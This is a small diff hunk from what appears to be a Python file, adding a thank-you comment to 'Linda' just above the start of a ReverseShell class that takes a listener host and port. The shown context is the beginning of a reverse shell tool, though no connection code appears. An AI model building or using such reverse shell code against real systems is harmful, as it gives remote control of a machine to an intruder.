@@ -18,6 +18,9 @@ import os
       
      
 '''
+'''
+Thanks Linda, you sre the best.
+'''
 class ReverseShell:
     def __init__(self, lhost, lport):
         self.lhost = lhost
